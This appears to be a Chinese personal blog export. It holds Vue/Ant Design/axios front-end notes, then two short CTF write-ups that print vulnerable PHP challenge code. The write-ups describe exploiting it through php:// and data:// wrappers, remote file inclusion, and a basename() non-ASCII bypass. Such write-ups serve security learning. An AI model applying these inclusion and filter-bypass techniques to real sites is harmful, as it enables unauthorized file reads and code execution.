class="name">a-sub-menu</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a-menu-item</span> <span class="attr">key</span>=<span class="string">&quot;9&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;setting&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a-icon</span> <span class="attr">type</span>=<span class="string">&quot;setting&quot;</span> /&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span>&gt;</span>系统设置<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">a-menu-item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a-menu-item</span> <span class="attr">key</span>=<span class="string">&quot;10&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;showModal&quot;</span>&gt;</span>        </span><br><span class="line">          <span class="tag">&lt;<span class="name">a-icon</span> <span class="attr">type</span>=<span class="string">&quot;login&quot;</span> /&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span> &gt;</span>登出<span class="tag">&lt;/<span class="name">span</span>&gt;</span> </span><br><span class="line">          <span class="tag">&lt;<span class="name">a-modal</span> <span class="attr">v-model</span>=<span class="string">&quot;visible&quot;</span> <span class="attr">title</span>=<span class="string">&quot;Basic Modal&quot;</span> @<span class="attr">ok</span>=<span class="string">&quot;handleOk&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>是否确定登出？<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">          <span class="tag">&lt;/<span class="name">a-modal</span>&gt;</span>        </span><br><span class="line">        <span class="tag">&lt;/<span class="name">a-menu-item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">a-menu</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a-layout-sider</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a-layout</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-layout-header</span> <span class="attr">theme</span>=<span class="string">dark</span> &gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;/<span class="name">a-layout-header</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- 上面是在导航栏最顶端加东西 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-layout-content</span> <span class="attr">style</span>=<span class="string">&quot;margin: 0 16px&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">      <span class="tag">&lt;/<span class="name">a-layout-content</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-layout-footer</span> <span class="attr">style</span>=<span class="string">&quot;text-align: center&quot;</span>&gt;</span></span><br><span class="line">        Ant Design ©2018 Created by Ant UED</span><br><span class="line">      <span class="tag">&lt;/<span class="name">a-layout-footer</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a-layout</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">a-layout</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>需要注意的是：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在Vue当中，这个相当于一个插槽，也就是，呃，类似一个include函数，我们如果想要把他当作模板的话就需要这样写，比如我们的report.vue</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> menus <span class="keyword">from</span> <span class="string">&#x27;../commons/menu&#x27;</span></span><br><span class="line"></span><br><span class="line">&lt;menu&gt;&lt;/menu&gt;</span><br><span class="line"><span class="comment">//在下面导入，之后再html当中使用即可</span></span><br><span class="line">components:&#123;</span><br><span class="line">        menus,</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure>

<h2 id="6-路由守卫"><a href="#6-路由守卫" class="headerlink" title="6.路由守卫"></a>6.路由守卫</h2><p>我们前端肯定是要鉴权的吧，不然用户就可对前端为所欲为了，故我们构造一个局部守卫是这样的：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">beforeRouteEnter</span>(<span class="params">to,<span class="keyword">from</span>,next</span>)</span> &#123;</span><br><span class="line">            axios.post(<span class="string">&#x27;/report&#x27;</span>).then(<span class="function"><span class="params">res</span> =&gt;</span>&#123;</span><br><span class="line">              <span class="keyword">if</span> (res.data == <span class="number">0</span>) next(&#123; <span class="attr">path</span>:<span class="string">&#x27;/&#x27;</span> &#125;);</span><br><span class="line">              <span class="keyword">else</span> next();</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;,</span><br></pre></td></tr></table></figure>

<p>这样的话，再访问该路由，离开路由的时候都会先访问一次页面，我们后端写好代码，如果用户没有登陆的话，就会返回到index页面了。</p>
<h2 id="7-期待值"><a href="#7-期待值" class="headerlink" title="7.期待值"></a>7.期待值</h2><p>这个理解起来单靠嘴说较为僵硬，需要实战中使用才可以领悟的清楚，比如我们的html代码中构造如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a-button</span> <span class="attr">type</span>=<span class="string">&quot;danger&quot;</span> <span class="attr">:style</span>=<span class="string">&quot;&#123;margin:&#x27;-20px 0px 0px 200px&#x27;&#125;&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;ExportSavePdf(htmlTitle,nowTime)&quot;</span>&gt;</span>报告生成<span class="tag">&lt;/<span class="name">a-button</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>（通过Vue框架，我们可以使用@click的方法来处理各种事件，之后填入一个函数，并写入函数的实参，而实参不一定是一定出现的，所以我们的实参可能会出现为null的情况，而Vue不想出现这种情况，所以要求我们填入默认值，也就是期待值，当我们没有填入参数的时候自动填入的参数</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      data,</span><br><span class="line">      columns,</span><br><span class="line">      htmlTitle: <span class="string">&#x27;report&#x27;</span>,</span><br><span class="line">      keyName: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<h2 id="8-设置默认值"><a href="#8-设置默认值" class="headerlink" title="8.设置默认值"></a>8.设置默认值</h2><p>有的时候，我们可能想在用户访问之前的时候直接获取数据，这样的话就可以直接拿到数据了，于是我们可以通过如下方法：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mounted() &#123;</span><br><span class="line">    <span class="comment">// this.drawChart();</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>以这种方式填入的值，当用户访问页面的时候便会自动进行调用。例子：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">axios.post(<span class="string">&#x27;/setting&#x27;</span>).then(<span class="function"><span class="params">res</span>=&gt;</span>&#123;</span><br><span class="line">      <span class="built_in">this</span>.usersData(res.data);</span><br><span class="line">      <span class="comment">// location.reload()</span></span><br><span class="line">    &#125;).catch(<span class="function"><span class="params">err</span>=&gt;</span>&#123;</span><br><span class="line">      <span class="comment">// console.log(err)</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h2 id="9-实现监听数据"><a href="#9-实现监听数据" class="headerlink" title="9.实现监听数据"></a>9.实现监听数据</h2><p>在之前的layui的时候，因为我不会对数据进行绑定，所以往往造成自己要写很多的type=hiden，或者必须构造form表单的情况，而使用框架之后可以通过v-model操作简单的实现这个效果，</p>
<p>例如我们可以构造如下代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;a-form-model-item style=<span class="string">&quot;margin: 0px 10px 0px 00px&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;selectAddress&quot;</span>&gt;</span><br><span class="line">                            &lt;a-input  type=<span class="string">&quot;password&quot;</span> placeholder=<span class="string">&quot;logKey&quot;</span> v-model=<span class="string">&quot;attackAddressName&quot;</span>&gt;</span><br><span class="line">                                &lt;a-icon slot=<span class="string">&quot;prefix&quot;</span> type=<span class="string">&quot;lock&quot;</span> style=<span class="string">&quot;color:rgba(0,0,0,.25)&quot;</span> /&gt;</span><br><span class="line">                            &lt;/a-input&gt;</span><br><span class="line">                    &lt;/a-form-model-item&gt;</span><br><span class="line">                        </span><br><span class="line">                    </span><br><span class="line">                    &lt;a-form-model-item <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;selectButton&quot;</span>&gt;</span><br><span class="line">                      &lt;a-button</span><br><span class="line">                            type=<span class="string">&quot;primary&quot;</span></span><br><span class="line">                            html-type=<span class="string">&quot;submit&quot;</span></span><br><span class="line">                            @click=<span class="string">&quot;selectAddress($event)&quot;</span></span><br><span class="line">                        &gt;</span><br><span class="line">                            添加</span><br><span class="line">                        &lt;/a-button&gt;</span><br><span class="line">                    &lt;/a-form-model-item&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在JS代码中：</span></span><br><span class="line">selectAddress:<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">      <span class="comment">// console.log(this.attackAddressName)</span></span><br><span class="line">      <span class="keyword">let</span> formAddress = <span class="keyword">new</span> FormData();</span><br><span class="line">      formAddress.append(<span class="string">&#x27;logname&#x27;</span>, <span class="built_in">this</span>.attackAddressName)</span><br><span class="line">      <span class="comment">// console.log(formAddress.get(&#x27;logname&#x27;))</span></span><br><span class="line">      <span class="built_in">this</span>.spinning = <span class="literal">true</span>;</span><br><span class="line">      axios.post(<span class="string">&#x27;/setting&#x27;</span>,formAddress).then(<span class="function"><span class="params">res</span> =&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> earchData =<span class="built_in">JSON</span>.parse(res.data)</span><br><span class="line">        <span class="comment">// console.log(res.data)</span></span><br><span class="line">        </span><br><span class="line">        <span class="built_in">this</span>.china(earchData);</span><br><span class="line">        <span class="built_in">this</span>.spinning = <span class="literal">false</span>;</span><br><span class="line">      &#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">      &#125;)</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们可以发现，我并没有写form表单，而我依然可以实现提交数据，是因为使用v-model监听之后，该input输入框的内容被JS实时监控着。</p>
<h2 id="10-监听的妙用"><a href="#10-监听的妙用" class="headerlink" title="10.监听的妙用"></a>10.监听的妙用</h2><p>利用监听，我们可以很轻松的完成对一些看起来很酷炫的特效，比如，如果用户想要提交点击一个按钮，就需要填写几个input框，并且如果框是空的，还可以给出提示等等，这里举出一个例子，比如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 用户名判断 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a-form-item</span> <span class="attr">:validate-status</span>=<span class="string">&quot;userNameError() ? &#x27;error&#x27; : &#x27;&#x27;&quot;</span> <span class="attr">:help</span>=<span class="string">&quot;userNameError() || &#x27;&#x27;&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-input</span></span></span><br><span class="line"><span class="tag">        <span class="attr">v-decorator</span>=<span class="string">&quot;[</span></span></span><br><span class="line"><span class="tag"><span class="string">          &#x27;userName&#x27;,</span></span></span><br><span class="line"><span class="tag"><span class="string">          &#123; rules: [&#123; required: true, message: &#x27;Please input your username!&#x27; &#125;] &#125;,</span></span></span><br><span class="line"><span class="tag"><span class="string">        ]&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">placeholder</span>=<span class="string">&quot;Username&quot;</span></span></span><br><span class="line"><span class="tag">      &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a-icon</span> <span class="attr">slot</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">type</span>=<span class="string">&quot;user&quot;</span> <span class="attr">style</span>=<span class="string">&quot;color:rgba(0,0,0,.25)&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">a-input</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a-form-item</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>顺便一提， 用:引号写入的东西，一般我们是用于条件判断，比如在这里，我们就是利用这个去判断userNameError的状况</p>
<p>在methods当中，我们构造如下代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">userNameError</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">     <span class="keyword">const</span> &#123; getFieldError, isFieldTouched &#125; = <span class="built_in">this</span>.form;</span><br><span class="line">     <span class="keyword">return</span> isFieldTouched(<span class="string">&#x27;userName&#x27;</span>) &amp;&amp; getFieldError(<span class="string">&#x27;userName&#x27;</span>);</span><br><span class="line">   &#125;,</span><br></pre></td></tr></table></figure>

<p>在data当中：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      hasErrors,</span><br><span class="line">      form: <span class="built_in">this</span>.$form.createForm(<span class="built_in">this</span>, &#123; <span class="attr">name</span>: <span class="string">&#x27;getWebsocket&#x27;</span> &#125;),</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<p>官方是如下解释的：</p>
<p>v-decorator 是 Ant Design 的控件验证属性。</p>
<p>经过 <code>getFieldDecorator</code> 或 <code>v-decorator</code> 包装的控件，表单控件会自动添加 <code>value</code>（或 <code>valuePropName</code> 指定的其他属性） <code>onChange</code>（或 <code>trigger</code> 指定的其他属性），数据同步将被 Form 接管，这会导致以下结果：</p>
<p>你不再需要也不应该用 <code>onChange</code> 来做同步，但还是可以继续监听 <code>onChange</code> 等事件。</p>
<p>你不能用控件的 <code>value defaultValue</code> 等属性来设置表单域的值，默认值可以用 <code>getFieldDecorator</code> 或 <code>v-decorator</code> 里的 initialValue。</p>
<p>你不应该用 <code>v-model</code>，可以使用 <code>this.form.setFieldsValue</code> 来动态改变表单值。</p>
<p>也就是说这种方式是吧form由Vue彻底托管了~和之前的不同，会自动判断是否存在值，如果不存在的话，将会调用v-decorator。当然这种方式我是比较模糊的，真要说我比较理解的是另外一个形式</p>
<h2 id="11-v-model的妙用"><a href="#11-v-model的妙用" class="headerlink" title="11.v-model的妙用"></a>11.v-model的妙用</h2><p>在html当中写下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a-form-model-item</span> <span class="attr">style</span>=<span class="string">&quot;margin: 0px 10px 0px 00px&quot;</span> <span class="attr">class</span>=<span class="string">&quot;selectAddress&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">a-input</span>  <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;logKey&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;attackAddressName&quot;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">a-icon</span> <span class="attr">slot</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">type</span>=<span class="string">&quot;lock&quot;</span> <span class="attr">style</span>=<span class="string">&quot;color:rgba(0,0,0,.25)&quot;</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">a-input</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a-form-model-item</span>&gt;</span></span><br><span class="line">                        </span><br><span class="line">                    </span><br><span class="line">                    <span class="tag">&lt;<span class="name">a-form-model-item</span> <span class="attr">class</span>=<span class="string">&quot;selectButton&quot;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">a-button</span></span></span><br><span class="line"><span class="tag">                            <span class="attr">type</span>=<span class="string">&quot;primary&quot;</span></span></span><br><span class="line"><span class="tag">                            <span class="attr">html-type</span>=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="tag">                            @<span class="attr">click</span>=<span class="string">&quot;selectAddress($event)&quot;</span></span></span><br><span class="line"><span class="tag">                        &gt;</span></span><br><span class="line">                            添加</span><br><span class="line">                        <span class="tag">&lt;/<span class="name">a-button</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a-form-model-item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a-alert</span> <span class="attr">message</span>=<span class="string">&quot;输入key，即可自动溯源&quot;</span> <span class="attr">type</span>=<span class="string">&quot;info&quot;</span> <span class="attr">class</span>=<span class="string">&quot;fontKey&quot;</span> /&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">a-spin</span> <span class="attr">size</span>=<span class="string">&quot;large&quot;</span> <span class="attr">class</span>=<span class="string">&quot;spinner&quot;</span> <span class="attr">:spinning</span>=<span class="string">&quot;spinning&quot;</span> <span class="attr">:delay</span>=<span class="string">&quot;delayTime&quot;</span> /&gt;</span></span><br><span class="line">                  </span><br></pre></td></tr></table></figure>

<p>注意这里的spinning，我们给她进行托管，如果可以的话，而spinning的期望默认值在data当中构造：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">data()&#123;</span><br><span class="line">    return&#123;</span><br><span class="line">    attackAddressName:&#x27;&#x27;,</span><br><span class="line">    spinning: false,</span><br><span class="line">    delayTime: 500,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<p>而当我们点击按钮发送数据之后：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">selectAddress:<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">      <span class="comment">// console.log(this.attackAddressName)</span></span><br><span class="line">      <span class="keyword">let</span> formAddress = <span class="keyword">new</span> FormData();</span><br><span class="line">      formAddress.append(<span class="string">&#x27;logname&#x27;</span>, <span class="built_in">this</span>.attackAddressName)</span><br><span class="line">      <span class="comment">// console.log(formAddress.get(&#x27;logname&#x27;))</span></span><br><span class="line">      <span class="built_in">this</span>.spinning = <span class="literal">true</span>;</span><br><span class="line">      axios.post(<span class="string">&#x27;/setting&#x27;</span>,formAddress).then(<span class="function"><span class="params">res</span> =&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> earchData =<span class="built_in">JSON</span>.parse(res.data)</span><br><span class="line">        <span class="comment">// console.log(res.data)</span></span><br><span class="line">        </span><br><span class="line">        <span class="built_in">this</span>.china(earchData);</span><br><span class="line">        <span class="built_in">this</span>.spinning = <span class="literal">false</span>;</span><br><span class="line">      &#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">      &#125;)</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>一旦数据成功发送过去，我们就将spinning的值改成true，这样就可以显示了，当获取数据之后，我们就改成false，让他消失即可</p>
<h1 id="axios-part"><a href="#axios-part" class="headerlink" title="axios part"></a>axios part</h1><h2 id="1-aiox发送数据"><a href="#1-aiox发送数据" class="headerlink" title="1.aiox发送数据"></a>1.aiox发送数据</h2><p>axios是一个组件，用于发送数据给后端，相当好用，我们为了降低代码耦合性，应该抓门建立一个axios文件夹，并且设置一个http.js，各种各样的设置我们都在axios当中进行配置即可：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">import axios from &#x27;axios&#x27;</span><br><span class="line"></span><br><span class="line">axios.defaults.baseURL = &#x27;http://localhost:8081&#x27;;</span><br><span class="line">axios.defaults.timeout = 1000000;</span><br><span class="line">axios.defaults.withCredentials = true</span><br></pre></td></tr></table></figure>



<p>例如这样，就是设置了默认的url，设置超时事件，带上cookies等等，而axios的使用也很简单，构造如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">axios.post(<span class="string">&quot;/login&quot;</span>,formData,config).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">res.data == <span class="number">0</span> </span>)</span>&#123;</span><br><span class="line">         alert(<span class="string">&quot;账号或密码错误！&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="built_in">this</span>.$message.success(<span class="string">` login successfully!`</span>);</span><br><span class="line">          router.push(&#123; <span class="attr">path</span>:<span class="string">&quot;/upload&quot;</span> &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">      &#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err)</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>axios.get/post</p>
<p>axios.get().theml().catch()</p>
<p>在then和cat当中去写别的东西，上图当中的res.data为API给回来的数据，成功之后router.push就可以让页面进行跳转了</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>感觉自己是边学边写的，学到后面的时候感觉之前的东西还可以做得更好，但是蓝狗了，已经不想动了orz</p>
]]></content>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>ZJCTF,就这？</title>
    <url>/2020/11/20/ZJCTF-%E5%B0%B1%E8%BF%99%EF%BC%9F/</url>
    <content><![CDATA[<p>经典的代码审计！</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>($file);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里注意第一步，需要我们读取到的文件的内容当中含有I have a dream，然而文件当中压根没有这个内容，于是该怎么办呢？有两个办法，第一个是利用php://input,data://伪协议</p>
<p>如果你使用php://input,那么php就会去读取body当中的内容，你只需要在这构造I have a dream即可，除此之外还有的就是利用data://伪协议，</p>
<p>还有远程文件包含</p>
]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>Zer0pts2020</title>
    <url>/2020/11/24/Zer0pts2020/</url>
    <content><![CDATA[<h1 id="Can-you-guess-it"><a href="#Can-you-guess-it" class="headerlink" title="Can you guess it?"></a>Can you guess it?</h1><p>一开始放源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, $_SERVER[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  $guess = (<span class="keyword">string</span>) $_POST[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $message = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Can you guess it?&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Can you guess it?&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;<span class="keyword">If</span> your guess is correct, I<span class="string">&#x27;ll give you the flag.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;hr&gt;</span></span><br><span class="line"><span class="string">&lt;?php if (isset($message)) &#123; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;?php &#125; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>

<p>虽然这里的猜测成功之后你可以拿到flag，但是很明显这里的函数并没有漏洞，用的函数没有什么问题，那么就转换思路看上面的 highlight_file，因为这里的参数我们也可以控制，介绍一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$_SERVER[<span class="string">&#x27;PHP_SELF&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>该参数会返回我们的URL的路径，如图所示：</p>
<p><img src="image-20201124124501905.png" alt="image-20201124124501905"></p>
<p>我们再用basename套上去</p>
<p><img src="image-20201124124659976.png" alt="image-20201124124659976"></p>
<p>这样就可以拿到最后一部分了，但是basename有一个问题：</p>
<p><img src="image-20201124124821264.png" alt="image-20201124124821264"></p>
<p>官网是有提示的，我们需要单独的setloale来进行操作，因为ascii中有这么一段介绍：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">在英语中，用128个符号编码便可以表示所有，但是用来表示其他语言，128个符号是不够的。比如，在法语中，字母上方有注音符号，它就无法用 ASCII 码表示。于是，一些欧洲国家就决定，利用字节中闲置的最高位编入新的符号。比如，法语中的é的编码为130（二进制10000010）。这样一来，这些欧洲国家使用的编码体系，可以表示最多256个符号 [5]  。</span><br><span class="line">但是，这里又出现了新的问题。不同的国家有不同的字母，因此，哪怕它们都使用256个符号的编码方式，代表的字母却不一样。比如，130在法语编码中代表了é，在希伯来语编码中却代表了字母Gimel (ג)，在俄语编码中又会代表另一个符号。但是不管怎样，所有这些编码方式中，0--127表示的符号是一样的，不一样的只是128--255的这一段 [5]  。</span><br><span class="line">至于亚洲国家的文字，使用的符号就更多了，汉字就多达10万左右。一个字节只能表示256种符号，肯定是不够的，就必须使用多个字节表达一个符号。比如，简体中文常见的编码方式是 GB2312，使用两个字节表示一个汉字，所以理论上最多可以表示 256 x 256 = 65536 个符号 [5]  。</span><br></pre></td></tr></table></figure>

<p>也就是说，一旦我们的ascii位数大于128，就会出现歧义的情况，而汉字默认使用的是GBK编码，如果我们输出的数大于128，basename因为无法正确的解析，就会忽略这 一段，向前查找。</p>
<p><img src="image-20201124125211434.png" alt="image-20201124125211434"></p>
<p>那我们的思路就很清楚了</p>
